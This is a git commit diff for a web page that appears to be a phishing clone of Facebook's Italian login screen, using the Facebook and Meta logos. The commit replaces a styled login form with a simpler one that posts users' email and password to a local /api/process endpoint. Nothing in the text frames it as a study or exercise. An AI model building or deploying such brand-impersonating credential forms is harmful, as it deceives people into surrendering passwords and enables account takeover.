eec3d23e1f2a14e5a8add82990c109afada2b36d
grisu1992 <simonegrisu92@gmail.com>
2025-07-19 00:04:59 +0200

    page.tsx

--- app/page.tsx
+++ app/page.tsx
@@ -11,27 +11,12 @@ export default function Home() {
         <p className="lang">Italiano</p>
         <img src="/facebook.png" alt="Logo Facebook" className="fb-logo" />
 
-        <div className="fb-login-box">
-          <form action="process.php" method="POST" className="fb-form">
-            <input
-              type="text"
-              name="email"
-              placeholder="Email o numero di telefono"
-              required
-            />
-            <input
-              type="password"
-              name="password"
-              placeholder="Password"
-              required
-            />
-            <button type="submit">Accedi</button>
-            <a href="#" className="forgot">Hai dimenticato la password?</a>
-            <hr />
-            <button className="create-account">Crea nuovo account</button>
-          </form>
-        </div>
-
+     <div> 
+<form action="/api/process" method="POST">
+  <input type="text" name="email" placeholder="Email" required />
+  <input type="password" name="password" placeholder="Password" required />
+  <button type="submit">Invia</button>
+</form></div>  
         <footer className="meta-footer">
           <img src="/meta.png" alt="Logo Meta" className="meta-logo" />
           <div className="meta-links">
